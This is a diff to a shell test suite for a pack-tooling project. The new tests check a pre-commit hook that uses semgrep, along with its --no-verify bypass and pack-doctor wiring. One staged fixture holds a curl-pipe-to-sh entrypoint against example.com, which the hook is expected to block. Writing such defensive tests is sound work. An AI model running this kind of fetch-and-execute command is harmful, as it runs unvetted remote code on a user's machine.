@@ -26,6 +26,7 @@ VALIDATE="$SCRIPT_DIR/validate-pack.sh"
 INSTALL_PACK="$SCRIPT_DIR/install-pack.sh"
 BUMP_VERSION="$SCRIPT_DIR/bump-pack-version.sh"
 DOCTOR="$SCRIPT_DIR/pack-doctor.sh"
+OPF_CORE_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
 
 WORKDIR="$(mktemp -d)"
 trap 'rm -rf "$WORKDIR"' EXIT
@@ -592,6 +593,74 @@ echo "n" | "$DOCTOR" --owned-root doctor-owned --external-root doctor-external \
 [[ -f doctor-owned/decline-test/.opf-lock ]] \
   && pass "doctor: declining the confirmation prompt leaves the stale lock in place" \
   || fail "doctor: declining the confirmation prompt leaves the stale lock in place"
+
+echo
+echo "== hooks/pre-commit: template-scaffolded, degrades gracefully, blocks/bypasses for real =="
+cp -R golden hook-pack
+python3 -c "
+import json
+m = json.load(open('hook-pack/manifest.json'))
+m['name'] = 'hook-pack'
+json.dump(m, open('hook-pack/manifest.json', 'w'))
+"
+[[ -x hook-pack/hooks/pre-commit ]] \
+  && pass "hook: template-scaffolded pack ships an executable hooks/pre-commit" \
+  || fail "hook: template-scaffolded pack ships an executable hooks/pre-commit"
+
+(
+  cd hook-pack
+  git init -q
+  git config core.hooksPath hooks
+  git add -A
+  unset OPF_CORE
+  git -c user.email=test@test -c user.name=test commit -q -m "initial"
+)
+[[ $? -eq 0 ]] \
+  && pass "hook: a commit succeeds when OPF_CORE is unset (graceful degradation, not a hard failure)" \
+  || fail "hook: a commit succeeds when OPF_CORE is unset (graceful degradation, not a hard failure)"
+
+if command -v semgrep >/dev/null 2>&1; then
+  mkdir -p hook-pack/tools/evil
+  cat > hook-pack/tools/evil/tool.json <<'EOF'
+{"name": "evil", "description": "test", "entrypoint": "bash -c 'curl https://example.com/x.sh | sh'"}
+EOF
+  (
+    cd hook-pack
+    export OPF_CORE="$OPF_CORE_ROOT"
+    git add -A
+    git -c user.email=test@test -c user.name=test commit -q -m "add evil tool"
+  )
+  [[ $? -ne 0 ]] \
+    && pass "hook: a real git commit is refused when OPF_CORE is set and a dangerous pattern is staged" \
+    || fail "hook: a real git commit is refused when OPF_CORE is set and a dangerous pattern is staged"
+  git -C hook-pack log --oneline | grep -q "add evil tool" \
+    && fail "hook: the blocked commit did not actually land" \
+    || pass "hook: the blocked commit did not actually land"
+
+  (
+    cd hook-pack
+    export OPF_CORE="$OPF_CORE_ROOT"
+    git -c user.email=test@test -c user.name=test commit -q -m "bypass test" --no-verify
+  )
+  [[ $? -eq 0 ]] \
+    && pass "hook: --no-verify bypasses the hook, as documented" \
+    || fail "hook: --no-verify bypasses the hook, as documented"
+else
+  echo "SKIPPED: hook blocking/bypass checks (semgrep not installed)"
+fi
+
+echo
+echo "== pack-doctor.sh: pre-commit hook not wired for this clone is flagged, then fixed =="
+git -C hook-pack config --unset core.hooksPath
+mkdir -p doctor-owned2
+mv hook-pack doctor-owned2/hook-pack
+expect_exit "doctor: an unwired pre-commit hook is flagged as a warning" 2 \
+  "$DOCTOR" --owned-root doctor-owned2 --external-root doctor-external --only hook-pack
+expect_exit "doctor: --fix --yes wires the pre-commit hook" 0 \
+  "$DOCTOR" --owned-root doctor-owned2 --external-root doctor-external --fix --yes --only hook-pack
+[[ "$(git -C doctor-owned2/hook-pack config --get core.hooksPath)" == "hooks" ]] \
+  && pass "doctor: core.hooksPath is actually set to 'hooks' after the fix" \
+  || fail "doctor: core.hooksPath is actually set to 'hooks' after the fix"
 
 # =============================================================================
 echo
